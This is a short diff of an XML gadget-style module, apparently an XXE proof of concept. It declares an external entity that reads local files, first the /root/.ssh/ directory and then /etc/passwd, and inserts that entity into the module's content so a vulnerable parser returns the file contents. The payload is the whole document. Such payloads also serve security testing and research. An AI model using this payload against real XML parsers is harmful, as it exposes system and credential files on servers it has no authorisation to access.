@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "file:///root/.ssh/" >]>
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 
 <Module>
 <ModulePrefs title="hello world xxxxxxxxx   example"/>
-<Content type="html"><![CDATA[
-Hello, world!
+<Content type="xml">&xxe;<![CDATA[
+Hello, world! &xxe;
 ]]>&xxe;</Content>
 </Module>
